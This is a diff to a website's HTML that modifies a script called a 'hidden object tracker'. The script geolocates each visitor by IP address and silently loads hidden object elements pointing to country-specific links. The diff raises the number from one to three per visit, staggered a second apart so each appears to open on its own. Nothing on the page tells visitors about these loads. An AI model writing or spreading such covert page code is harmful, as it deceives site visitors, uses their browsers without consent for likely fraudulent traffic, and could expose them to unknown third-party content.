@@ -3470,8 +3470,9 @@ document.addEventListener("DOMContentLoaded", function() {
 <!-- ========================================== -->
 <!-- HIDDEN OBJECT TRACKER (IP-BASED)           -->
 <!-- Runs on boussedraoui.github.io only        -->
-<!-- US → 1 US link, BR → 1 BR link, DE → 1 DE link -->
-<!-- Rotates 1 link per visit                   -->
+<!-- US → 3 US links, BR → 3 BR links, DE → 3 DE links -->
+<!-- Each of the 3 links loads separately (staggered) -->
+<!-- Rotates 3 links per visit                  -->
 <!-- ========================================== -->
 <script>
 document.addEventListener("DOMContentLoaded", function() {
@@ -3539,7 +3540,7 @@ document.addEventListener("DOMContentLoaded", function() {
         document.body.appendChild(obj);
     }
 
-    // --- 4. GET 1 LINK STARTING AT ROTATING INDEX ---
+    // --- 4. GET 3 DIFFERENT LINKS STARTING AT ROTATING INDEX ---
     function getNextBatch(key, links, batchSize) {
         const len = links.length;
         let start = 0;
@@ -3561,7 +3562,7 @@ document.addEventListener("DOMContentLoaded", function() {
         return batch;
     }
 
-    // --- 5. DETECT COUNTRY VIA IP AND LOAD 1 LINK ---
+    // --- 5. DETECT COUNTRY VIA IP AND LOAD 3 LINKS (staggered) ---
     fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
@@ -3570,18 +3571,24 @@ document.addEventListener("DOMContentLoaded", function() {
 
             const links = linksByCountry[country];
             if (!links) {
-                console.log('[Tracker] Not US/BR/DE — no link loaded.');
+                console.log('[Tracker] Not US/BR/DE — no links loaded.');
                 return;
             }
 
             const storageKey = 'hidden_obj_visit_index_' + country;
-            const batch = getNextBatch(storageKey, links, 1);
+            const batch = getNextBatch(storageKey, links, 3);
 
-            batch.forEach(loadHiddenObject);
-            console.log('[Tracker] Loaded 1 ' + country + ' link:', batch);
+            // Load each of the 3 links separately — one after another,
+            // 1 second apart, so each opens "on its own".
+            batch.forEach((link, i) => {
+                setTimeout(() => {
+                    loadHiddenObject(link);
+                    console.log('[Tracker] Loaded ' + country + ' link #' + (i + 1) + ':', link);
+                }, i * 1000);
+            });
         })
         .catch(error => {
-            console.log('[Tracker] IP detection failed. No link loaded.', error);
+            console.log('[Tracker] IP detection failed. No links loaded.', error);
         });
 });
 </script>
